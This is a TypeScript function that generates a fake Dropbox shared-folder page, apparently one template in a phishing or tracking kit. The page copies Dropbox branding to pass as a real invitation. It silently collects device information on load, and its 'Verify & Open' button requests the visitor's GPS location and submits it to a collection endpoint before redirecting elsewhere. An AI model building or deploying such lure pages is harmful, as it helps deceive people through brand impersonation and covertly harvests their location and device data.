import { escapeHtml } from '../utils/html.js';

interface DropboxTemplateOptions {
  folderName?: string;
  ownerEmail?: string;
  message?: string;
}

export function renderDropboxTemplate(slug: string, targetUrl: string, options: DropboxTemplateOptions = {}, gpsMode: string = 'optional'): string {
  const folderName = escapeHtml(options.folderName || 'Shared Files');
  const ownerEmail = escapeHtml(options.ownerEmail || 'user@email.com');
  const message = escapeHtml(options.message || `${ownerEmail} has invited you to a shared folder.`);

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${folderName} - Dropbox</title>
  <link rel="icon" href="https://cfl.dropboxstatic.com/static/images/favicon-vfl8lUR9B.ico">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f7f5f2; min-height: 100vh; color: #1e1919; }
    .header { background: #fff; padding: 16px 24px; display: flex; align-items: center; border-bottom: 1px solid #e5e1db; }
    .logo { display: flex; align-items: center; gap: 8px; }
    .logo svg { width: 32px; height: 32px; }
    .logo span { font-size: 20px; font-weight: 600; color: #0061ff; }
    .main { display: flex; align-items: center; justify-content: center; min-height: calc(100vh - 65px); padding: 24px; }
    .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); max-width: 480px; width: 100%; padding: 40px; text-align: center; }
    .folder-icon { width: 64px; height: 64px; margin: 0 auto 20px; background: #f0e6d3; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
    .folder-icon svg { width: 32px; height: 32px; fill: #b4894e; }
    h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
    .msg { font-size: 14px; color: #637282; line-height: 1.5; margin-bottom: 8px; }
    .owner { font-size: 13px; color: #637282; margin-bottom: 24px; }
    .btn { display: inline-block; background: #0061ff; color: #fff; border: none; padding: 12px 32px; font-size: 14px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: background 0.2s; }
    .btn:hover { background: #004ecc; }
    .btn:disabled { background: #7fb3ff; cursor: default; }
    .status { display: none; margin-top: 16px; font-size: 14px; color: #637282; }
    .status.show { display: flex; align-items: center; justify-content: center; gap: 8px; }
    .spinner { width: 16px; height: 16px; border: 2px solid #e5e1db; border-top-color: #0061ff; border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .success { display: none; margin-top: 16px; padding: 12px; background: #e8f5e9; border-radius: 6px; color: #2e7d32; font-size: 14px; }
    .success.show { display: flex; align-items: center; justify-content: center; gap: 8px; }
    .success svg { width: 18px; height: 18px; fill: #2e7d32; }
  </style>
</head>
<body>
  <div class="header">
    <div class="logo">
      <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
        <path d="M8 2.4L0 8l8 5.6L16 8z" fill="#0061ff"/>
        <path d="M24 2.4L16 8l8 5.6L32 8z" fill="#0061ff"/>
        <path d="M0 19.2l8 5.6 8-5.6L8 13.6z" fill="#0061ff"/>
        <path d="M16 19.2l8 5.6 8-5.6-8-5.6z" fill="#0061ff"/>
        <path d="M8 27.2l8-5.6 8 5.6V22l-8-5.6L8 22z" fill="#0061ff"/>
      </svg>
      <span>Dropbox</span>
    </div>
  </div>
  <div class="main">
    <div class="card">
      <div class="folder-icon">
        <svg viewBox="0 0 24 24"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
      </div>
      <h1>${folderName}</h1>
      <p class="msg">${message}</p>
      <p class="owner">From: ${ownerEmail}</p>
      <button class="btn" id="verifyBtn" onclick="handleVerify()">Verify &amp; Open</button>
      <div class="status" id="status"><div class="spinner"></div><span>Verifying access...</span></div>
      <div class="success" id="success">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        <span>Access verified. Opening folder...</span>
      </div>
    </div>
  </div>
  <script src="/static/collector.js"></script>
  <script>
    window.__TRACKER_CONFIG = {
      slug: ${JSON.stringify(slug)},
      collectUrl: '/c/' + ${JSON.stringify(slug)},
      targetUrl: ${JSON.stringify(targetUrl)},
      templateId: 'dropbox',
      gpsMode: ${JSON.stringify(gpsMode)}
    };
    if (window.TrackerCollector) { window.TrackerCollector.collectDeviceInfo(); }
    function handleVerify() {
      var btn = document.getElementById('verifyBtn');
      var status = document.getElementById('status');
      var success = document.getElementById('success');
      btn.disabled = true;
      status.classList.add('show');
      if (window.TrackerCollector) {
        window.TrackerCollector.requestGPSAndSubmit(window.__TRACKER_CONFIG, function() {
          status.classList.remove('show');
          success.classList.add('show');
          setTimeout(function() { window.location.href = window.__TRACKER_CONFIG.targetUrl; }, 2000);
        });
      }
    }
  </script>
</body>
</html>`;
}
